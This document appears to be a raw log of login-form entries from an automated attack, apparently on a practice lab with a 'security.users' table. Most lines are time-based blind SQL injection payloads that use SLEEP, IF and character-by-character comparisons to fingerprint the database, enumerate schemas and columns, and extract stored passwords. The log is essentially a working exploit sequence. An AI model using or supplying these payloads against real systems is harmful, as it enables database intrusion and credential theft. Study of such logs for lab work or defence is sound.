User Name:rdsdPassword:dsa456
User Name:iujiPassword:jjhik
User Name:ui huiPassword:lkpkol
User Name:123Password:0212
User Name:123Password:0212
User Name:123.((.(.'(("Password:0212
User Name:123'MyexeQ<'">txYVAjPassword:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123Password:0212
User Name:123) AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND (2060=2060Password:0212
User Name:123 AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs)Password:0212
User Name:123 AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs)-- EDtcPassword:0212
User Name:123') AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND ('HZRc'='HZRcPassword:0212
User Name:123' AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND 'aWtT'='aWtTPassword:0212
User Name:123' AND (SELECT 2973 FROM (SELECT(SLEEP(0)))lmjs) AND 'aWtT'='aWtTPassword:0212
User Name:123' AND (SELECT 2973 FROM (SELECT(SLEEP(5)))lmjs) AND 'aWtT'='aWtTPassword:0212
User Name:123' AND (SELECT 5874 FROM (SELECT(SLEEP(5-(IF(23=23,0,5)))))ksGo) AND 'SqSF'='SqSFPassword:0212
User Name:123' AND (SELECT 3543 FROM (SELECT(SLEEP(5-(IF(23=48,0,5)))))Eakq) AND 'TDMX'='TDMXPassword:0212
User Name:123' AND (SELECT 5321 FROM (SELECT(SLEEP(5-(IF(23=62,0,5)))))feAz) AND 'aRvj'='aRvjPassword:0212
User Name:123' AND (SELECT 4945 FROM (SELECT(SLEEP(5-(IF(62=48,0,5)))))aYQC) AND 'uJYT'='uJYTPassword:0212
User Name:123' AND (SELECT 3709 FROM (SELECT(SLEEP(5-(IF(48=48,0,5)))))pbUB) AND 'THnm'='THnmPassword:0212
User Name:123' AND (SELECT 4336 FROM (SELECT(SLEEP(5-(IF(62 48,0,5)))))UWWf) AND 'ezLZ'='ezLZPassword:0212
User Name:123' AND (SELECT 1011 FROM (SELECT(SLEEP(5-(IF(7317>7316,0,5)))))Hetg) AND 'ClUr'='ClUrPassword:0212
User Name:123' AND (SELECT 3912 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))GCJq) AND 'GCdv'='GCdvPassword:0212
User Name:123' AND (SELECT 6567 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x255469444225,0,5)))))BlnH) AND 'pujT'='pujTPassword:0212
User Name:123' AND (SELECT 8466 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x256472697a7a6c6525,0,5)))))ZYCs) AND 'KzOJ'='KzOJPassword:0212
User Name:123' AND (SELECT 9770 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x25506572636f6e6125,0,5)))))OpTC) AND 'BhRt'='BhRtPassword:0212
User Name:123' AND (SELECT 2441 FROM (SELECT(SLEEP(5-(IF(AURORA_VERSION() LIKE 0x25,0,5)))))sADM) AND 'LfVS'='LfVSPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>51,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>54,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>52,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>53,0,5)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))!=54,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>51,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>48,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:123' AND (SELECT 3624 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>9,0,1)))))uKyp) AND 'BRDl'='BRDlPassword:0212
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),7,1))>116,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),7,1))>114,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),7,1))>113,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),7,1))!=114,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>96,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>48,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>1,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>24,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>36,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>42,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>39,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))>40,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),8,1))!=40,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))>64,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))>32,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))>48,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))>56,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))>52,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))>50,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))>49,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),9,1))!=50,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))>47,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))>87,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))>67,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))>57,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))>52,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))>49,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))>48,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),10,1))!=48,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>47,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>1,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>24,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>35,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>41,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>38,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>39,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))>40,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),11,1))!=41,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),12,1))>64,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),12,1))>32,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:Dumb' AND (SELECT 6341 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND column_name=0x70617373776f7264 AND table_schema=0x7365637572697479),12,1))>1,0,2)))))pMBy) AND 'FVHU'='FVHUPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:DumbPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),1,1))>51,0,5)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),1,1))>48,0,5)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),1,1))>49,0,5)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),1,1))!=49,0,5)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),2,1))>51,0,5)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),2,1))>48,0,5)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),2,1))>49,0,5)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),2,1))>50,0,1)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),2,1))!=51,0,1)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),3,1))>51,0,1)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),3,1))>48,0,1)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 9551 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `security`.users),3,1))>9,0,1)))))jyMk) AND 'bYKz'='bYKzPassword:Dumb
User Name:Dumb' AND (SELECT 8472 FROM (SELECT(SLEEP(1-(IF((SELECT COUNT(password) FROM `security`.users)>0,0,1)))))aIef) AND 'gNfn'='gNfnPassword:Dumb
User Name:Dumb' AND (SELECT 9538 FROM (SELECT(SLEEP(1-(IF((SELECT COUNT(username) FROM `security`.users)>0,0,1)))))xEnB) AND 'mhis'='mhisPassword:Dumb
User Name:Dumb' AND (SELECT 2011 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM `security`.users ORDER BY password LIMIT 0,1),1,1))>981462,0,1)))))qyMe) AND 'VAUw'='VAUwPassword:Dumb
User Name:Dumb' AND (SELECT 2011 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM `security`.users ORDER BY password LIMIT 0,1),1,1))>506100,0,1)))))qyMe) AND 'VAUw'='VAUwPassword:Dumb
User Name:Dumb' AND (SELECT 2011 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM `security`.users ORDER BY password LIMIT 0,1),1,1))>643594,0,1)))))qyMe) AND 'VAUw'='VAUwPassword:Dumb
User Name:Dumb' AND (SELECT 2011 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM `security`.users ORDER BY password LIMIT 0,1),1,1))>551142,0,1)))))qyMe) AND 'VAUw'='VAUwPassword:Dumb
User Name:Dumb' AND (SELECT 2011 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM `security`.users ORDER BY password LIMIT 0,1),1,1))>522727,0,1)))))qyMe) AND 'VAUw'='VAUwPassword:Dumb
User Name:Dumb' AND (SELECT 2011 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM `security`.users ORDER BY password LIMIT 0,1),1,1))>910477,0,1)))))qyMe) AND 'VAUw'='VAUwPassword:Dumb
